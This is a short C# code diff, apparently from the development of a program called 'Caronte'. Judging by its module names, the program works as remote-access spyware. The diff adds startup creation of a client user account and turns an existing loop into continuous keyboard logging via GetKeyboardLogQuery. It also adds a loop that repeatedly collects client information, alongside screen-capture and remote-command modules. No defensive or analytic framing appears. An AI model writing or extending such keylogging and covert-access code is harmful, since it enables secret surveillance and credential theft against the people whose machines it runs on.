@@ -1,4 +1,6 @@
-﻿using Caronte.Modules.Logger;
+﻿using Caronte.Modules.CreateClientUser;
+using Caronte.Modules.GetClientInformation;
+using Caronte.Modules.Logger;
 using Caronte.Modules.PrintScreen;
 using Caronte.Modules.ReceiveCommand;
 using MediatR;
@@ -34,6 +36,8 @@ namespace Caronte
 
         public async Task Initialize()
         {
+            await _mediator.Send(new CreateClientUserQuery());
+
             await Task.WhenAll(CreateExecutionQueue());
         }
 
@@ -43,7 +47,7 @@ namespace Caronte
             {
                 while (!_cancellationToken.IsCancellationRequested)
                 {
-                    await _mediator.Send(new LogQuery());
+                    await _mediator.Send(new GetKeyboardLogQuery());
                 }
             }, _cancellationToken);
 
@@ -84,7 +88,7 @@ namespace Caronte
             {
                 while (!_cancellationToken.IsCancellationRequested)
                 {
-                    await _mediator.Send(new );
+                    await _mediator.Send(new GetClientInformationQuery());
                 }
             }, _cancellationToken);
 
